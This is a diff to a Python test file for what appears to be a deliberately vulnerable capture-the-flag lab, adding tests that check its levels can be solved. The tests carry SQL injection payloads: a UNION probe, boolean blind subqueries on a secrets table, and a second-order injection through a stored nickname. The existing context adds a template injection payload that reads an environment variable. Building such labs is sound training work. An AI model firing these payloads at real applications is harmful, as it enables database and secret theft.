@@ -85,3 +85,27 @@ def test_the_cipher_ssti_reads_the_flag(monkeypatch, tmp_path):
     db = _db_for(lv)                                             # seed() puts the flag in the env
     payload = "{{__import__('os').environ['DEADWOOD_CIPHER']}}"
     assert lv.flag().encode() in lv.handle(_req({"name": payload}), db).body
+
+
+def test_dead_mans_hand_waf_and_blind_path(monkeypatch, tmp_path):
+    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
+    lv = by_slug("dead-mans-hand")
+    db = _db_for(lv)
+    assert b"disabled" in lv.handle(_req({"id": "1 UNION SELECT 1"}), db).body      # WAF blocks UNION
+    assert b"record found" in lv.handle(_req({"id": "1"}), db).body                 # boolean: true
+    assert b"no such record" in lv.handle(_req({"id": "999999"}), db).body          # boolean: false
+    # the flag is reachable blind, by name (no catalog, no quotes): a true subquery → found
+    probe = lv.handle(_req({"id": "1 AND ((SELECT count(*) FROM secrets)>=0)"}), db).body
+    assert b"record found" in probe
+
+
+def test_the_vault_second_order_injection(monkeypatch, tmp_path):
+    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
+    lv = by_slug("the-vault")
+    db = _db_for(lv)
+    reg = _req({"nickname": "nobody' UNION SELECT value FROM secrets-- -"})
+    reg.subpath = "/register"
+    lv.handle(reg, db)                                           # stored safely…
+    board = _req({})
+    board.subpath = "/board"
+    assert lv.flag().encode() in lv.handle(board, db).body       # …executed on the board
